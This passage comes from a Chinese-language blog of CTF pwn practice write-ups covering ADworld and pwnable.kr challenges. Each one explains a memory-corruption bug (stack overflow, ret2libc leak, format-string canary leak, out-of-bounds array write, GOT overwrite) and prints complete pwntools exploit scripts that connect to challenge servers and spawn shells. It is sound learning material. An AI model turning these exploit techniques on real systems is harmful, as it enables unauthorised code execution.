alt="image-20200606153058583"></p><p>但利用起来，既没有有system函数，也没有’/bin/sh’。这对于刚接触pwn还是比较困难的，但本来就学习的过程，看了writeup又去学了下.plt与.got再来做的题。</p><p>其实程序带了一个运行库的，里面有动态链接库的函数及一些其他信息。既然程序里没有自然就利用这个运行库了，根据elf文件与pe文件类似，各个函数与数据的相对地址是不变的。利用这一点与我们在程序中是调用了write与read动态库函数的，随便选择一个得到他们的地址，再根据相对地址相加减就得到我们要的函数与数据（system()与‘/bin/sh’）的地址了。</p><p>首先计算在运行库里的的read函数与system函数的相对地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sys_cha = hex(lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'read'</span>])</span><br></pre></td></tr></table></figure><p>计算运行库中read函数与 ‘/bin/sh’的相对地址。先找到 ’/bin/sh’的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc_32.so<span class="number">.6</span> --string <span class="string">'/bin/sh'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606155906601.png" alt="image-20200606155906601"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">bin_cha = hex(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">'read'</span>])</span><br></pre></td></tr></table></figure><p>有 a-b=c，现在我们有了c，只需通过程序溢出就可以找到b, 最后通 a = b+c得到我们要的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54407</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(elf.symbols[<span class="string">'main'</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure><p>将各部分结合起来，脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54407</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(elf.symbols[<span class="string">'main'</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">bin_cha = int(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">'read'</span>])</span><br><span class="line">bin_addr = read_addr + bin_cha</span><br><span class="line"></span><br><span class="line">sys_cha = int(lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'read'</span>])</span><br><span class="line">sys_addr = read_addr + sys_cha</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload1 = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(sys_addr)+p32(<span class="number">1</span>)+p32(bin_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606172047471.png" alt="image-20200606172047471"></p><p><strong>总结：1.u32()相当于p32()的逆运算。2.ELF的各种使用。3.对.plt与.got的学习。4. 从运行库寻找所要函数与数据。5.这道题对于刚接触pwn的来做，可做性很高。</strong></p><h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><blockquote><p>上之前做的 guess_game 一个道理。通过栈溢出，改变程序特定的值。</p></blockquote><p>查保护没有 canary，这也算是引导了，因为是做题。</p><p>ida中看一下。就是随机数种子精确到了秒，所以直接通过栈溢出改变种子的值。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200607160312039.png" alt="image-20200607160312039"></p><p>写脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">43642</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x50</span><span class="number">-0x10</span>)*<span class="string">'a'</span> + p64(<span class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'point(1~6): '</span>)</span><br><span class="line">    p.sendline(str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200607160518598.png" alt="image-20200607160518598"></p><p><strong>总结：1.虽然没有接触新知识，但是学了加载libc.so.6库使用其的函数。</strong></p><h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><blockquote><p>由于数组没有控制界限，还是栈溢出。这个题由于出题人在题中直接给出了bin/bash，而环境中只有sh，但只要ROP一下，自己通过bin/bash构造sh给system做参数即可。</p></blockquote><p>查保护，除了基地址随机化其他全开。感觉会有点麻烦，难度要绕过canary？ida中看一下。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105006912.png" alt="image-20200609105006912"></p><p>正好看到字符串中有现成的system函数及shell，所以通过上面的数组溢出将函数的返回地址改为system处的地址就得到shell了。</p><p>开始计算数组的地址到函数返回地址处在栈中的偏移，由于ida中静态看到的栈分布可能不准，通过gdb动调看一下。找到第一次给数组赋值的地址及最后ret指令地址下断。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105624424.png" alt="image-20200609105624424"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105703718.png" alt="image-20200609105703718"></p><p>可以看到上面2次的地址分别为<strong>0xffffd01c</strong> <strong>0xffffcf98</strong> 2者之差为<strong>0x84</strong>，即我们要的偏移。</p><p>开始写脚本攻击，但是并没有得到shell。。。找了一会儿错误，没发现。看了其他人的writeup说由于出题人原因，环境中并没有bash，可以通过已有的 /bin/bash得到sh字符串，作为system()参数才行。</p><p>也很容易，直接找到字符串地址，利用数组越界多改变栈中的一个数据为<strong>sh</strong>作为system()的参数即可。exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">58409</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">132</span></span><br><span class="line">system_addr = [<span class="number">0xb4</span>, <span class="number">0x85</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line">sh_addr = [<span class="number">0x87</span>, <span class="number">0x89</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_</span><span class="params">(offset, val)</span>:</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(val))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">write_(offset+i, system_addr[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">write_(offset+<span class="number">4</span>+i, sh_addr[i])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609110724445.png" alt="image-20200609110724445"></p><p>最后关于这个题的栈从ida中静态看到栈与实际动调不同的原因，看开头与结尾的汇编代码可以知道答案。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610140544469.png" alt="image-20200610140544469"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610140847175.png" alt="image-20200610140847175"></p><p><strong>总结：1.从这个题发现数组越界就可以绕过canary，但也是题故意设计的而已。2.静态看到的栈分布于实际运行的可能会不同，这道题就是。</strong></p><h3 id="forot"><a href="#forot" class="headerlink" title="forot"></a>forot</h3><blockquote><p>栈溢出，多了会对输入字符进行判断多构造下。但是当对整个main函数运行完后在ret处控制其走向始终不成功。。。gdb调试栈的偏移反复确定了的，比在ida中静态看到的大4，但这多出来的4就很迷。。。最后觉得是程序在出栈时有一个值还原，有点canary的意思，但是程序没有开canary保护啊。搞了很久还是没弄清原因，后面知识积累多了再来看看怎么回事。。。</p></blockquote><p>只开了NX保护，ida中看下。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610171656557.png" alt="image-20200610171656557"></p><p>再看看栈的情况。找到v3与v2数组的地址。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610171941539.png" alt="image-20200610171941539"></p><p>再看到程序中直接有system函数及字符串。</p><p>所以接下来要做的就是改变函数指针并控制v14的值，构造其执行我们的system（）函数。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610172311560.png" alt="image-20200610172311560"></p><p>写脚本攻击。这里方法也很多吧，只要构造配合好就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">39422</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'A'</span>+p32(<span class="number">0x080486D2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'Bxnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610172459341.png" alt="image-20200610172459341"></p><p><strong>总结：1.还是栈溢出，但不是通过改变函数的返回地址，见识更多了吧。2.\x09与\xa是坏字符，当读到这2个字符的时候会截断。</strong></p><h3 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h3><blockquote><p>通过格式化字符串漏洞找到canary后栈溢出控制程序走向。但是。。。。。。。因为开始使用的recvuntil(‘’)没有注意<strong>‘\n’</strong>导致后面直接使用recv()开始只能接收到<strong>’\n’</strong>，花了好多时间卡在这里。。。。。。。。。。算教训了。</p></blockquote><p>除了PIE其他保护全开。运行看一下，让选择是栈溢出还是格式化字符串漏洞。 ida中看看。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200611162320998.png" alt="image-20200611162320998"></p><p>虽然是第一次遇到，但也是很容易想到，格式化字符串漏洞是让我们泄露canary用的，知道的canary就可以快乐的栈溢出了。</p><p>那剩下的就都是常规操作了，脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">53667</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">'%23$p'</span>)</span><br><span class="line">canary = int(p.recv(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">'a'</span> + p64(canary) + <span class="number">8</span>*<span class="string">'a'</span> + p64(<span class="number">0x00000000004008DA</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>问题来了。。。无论怎么改<strong>canary = int(p.recv(), 16)</strong>接受屏幕打印出的字符这句话都报错。。。2个多小时耗在这里。。。后面就试了试先<strong>p.recvuntil(‘0x’)</strong>，成功了。。。但自己还是很郁闷。。。又继续找原因，最后才发现<strong>p.recvuntil(‘3. Exit the battle ‘)</strong>中少了 <strong>\n</strong>，导致后面直接recv()接受到的都是回车，还是recvuntil()保障。。。</p><p>加上后再攻击，成功。。。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200611163417332.png" alt="image-20200611163417332"></p><p>总结：1.还是多用recvuntil吧，保障些。2.注意使用recvuntil时中的字符串是否包含到最后。3.RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><blockquote><p>ADworld没有给题目附件，最后看了看别人发的ida伪代码，就只是简单的栈溢出控制程序走向。</p></blockquote><p>题目开头就给了一个地址，后面又是明显的栈溢出，猜也可猜到是将函数返回地址覆盖为给出的地址。</p><p>脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">37196</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x40</span>+<span class="number">8</span>)*<span class="string">'a'</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200612101533939.png" alt="image-20200612101533939"></p><h2 id="pwnable"><a href="#pwnable" class="headerlink" title="pwnable"></a>pwnable</h2><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><p>题目描述。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603151159958.png" alt="image-20200603151159958"></p><p>通过ssh连接后，有3个文件，flag没有权限查看，那就看 fd.c</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603151520348.png" alt="image-20200603151520348"></p><p>由于read函数的第一个参数，0：标准输入；1：标准输出；2：标准错误输出。那这里只要样fd等于0就好了。</p><p>直接让输入第一个参数为 4,660(0x1234)，接着再输入 LETMEWIN 得到flag。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152007549.png" alt="image-20200603152007549"></p><h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><blockquote><p>学习了栈溢出后做这个题正合适</p></blockquote><p>得到题目的elf文件后ida打开。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152328450.png" alt="image-20200603152328450"></p><p>再利用ida中很好的栈显示，计算得到需要填充大小 0x34 。</p><p>写py脚本，攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="number">0x34</span>*<span class="string">'a'</span> + p32(<span class="number">0xCAFEBABE</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(message)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152657713.png" alt="image-20200603152657713"></p><h3 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h3><p>题目描述。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605090406828.png" alt="image-20200605090406828"></p><p>ssh连接后发现就是让我们输入20个字节的数据，然后转化为5个4字节数据的值相加为0x21DD09EC。</p><p>那就直接凑了，开始直接想的是输入16个0加一个原数据，但字符串计算长度时就会过不了。那凑得方法也很多，只是怎样将不可打印字符输入终端，知道可以使用python的单行执行脚本呢 -c。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605090938145.png" alt="image-20200605090938145"></p><p>另外其实一直想用脚本直接实现，但是不知道怎么用，网上果然有，学习了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = p32(<span class="number">0x6c5cec9</span>)*<span class="number">4</span> + p32(<span class="number">0x6c5cec8</span>)</span><br><span class="line"></span><br><span class="line">p = ssh(host=<span class="string">'pwnable.kr'</span>, port=<span class="number">2222</span>, user=<span class="string">'col'</span>, password=<span class="string">'guest'</span>)</span><br><span class="line">p.connected()</span><br><span class="line"></span><br><span class="line">p1 = p.process(argv=[<span class="string">'col'</span>, s], executable=<span class="string">'./col'</span>)</span><br><span class="line"><span class="keyword">print</span> p1.recv()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605092003637.png" alt="image-20200605092003637"></p><p>总结：1.利用python单行脚本输入不打印字符数据。2.利用脚本对ssh连接并交互的方法。3.哈希碰撞的概念。</p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>查看保护的时候发现了upx壳，脱壳后载入ida即可发现flag。</p><p>总结：无。</p><h3 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h3><blockquote><p>利用scanf()函数中没加取址符&amp;存在的漏洞，覆写got表来达到控制程序走向的目的。</p></blockquote><p>题目描述。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608181103998.png" alt="image-20200608181103998"></p><p>连接后查看passcode.c文件，可以看到scanf()是没有加取地址符的，想通过输入达到目的肯定会报错。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看到welcome（）函数，scanf(“%100s”, name)对输入字符串长度进行了限制，想通过溢出是不行了。</p><p>既然程序出了问题是没加取址符，那突破口肯定就在哪里。又是我第一次遇到的漏洞类型，由于scanf(“%d”, passcode1)中passcode1没加取地址符，将会把passcode1本身的值作为地址然后向其写入数据。并且这个passcode1没有初始化，所以它的默认的值将是上次栈中留下来的值，我们就可以控制上次向栈中写的数据，使scanf（）中的地址是我们向输入数据的地址。</p><blockquote><p>知识点：在welcome（）函数结束后，虽然它会<strong>push esp, ebp；pop ebp；ret</strong>进行一个堆栈平衡，但是只是改变了esp寄存器的值，栈中的内容没有进行清理，如果下次使用同一个栈定义了变量但没有赋初值，那它的初始值将是上次栈中的。</p></blockquote><p>由于got表是可以重写的，它记录着我们要执行函数的地址，那我们就可以将下次要执行的函数地址改成我们想要它执行的函数地址。通过<strong>objdump -R passcode</strong>查看got表。可以看到我们要改写函数在got表中地址为  <strong>0x0804a004</strong></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608182629397.png" alt="image-20200608182629397"></p><p>找我们想要执行的函数的地址。使用<strong>objdump -d passcode</strong>查看反汇编。找到我们想要执行函数地址：<strong>0x080485e3</strong></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608183049831.png" alt="image-20200608183049831"></p><p>地址找到后，寻找第一次welcome()函数中输入的字符串的哪一部分会是后面login()函数的第一个变量的值。其实很简单，2个函数是同一个ebp，第一个函数输入的最后4个字节数据将是第二个函数第一个变量的4个字节数据。（解释起来有点抽象，理解了就很简单）</p><p>最后构造字符串，攻击。由于登录到远程终端里没有执行和写脚本的权限，直接使用python与管道命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print 'a'*96 + '\x04\xa0\x04\x08' + '134514147'"</span> | ./passcode</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608184738940.png" alt="image-20200608184738940"></p><p>总结：1.2个命令的学习 objdump -R 文件名（查看got表） 与 objdump -d 文件名（查看反汇编）。2.覆写got的攻击。</p><h2 id="论剑场"><a href="#论剑场" class="headerlink" title="论剑场"></a>论剑场</h2><h3 id="pwn4"><a href="#pwn4" class="headerlink" 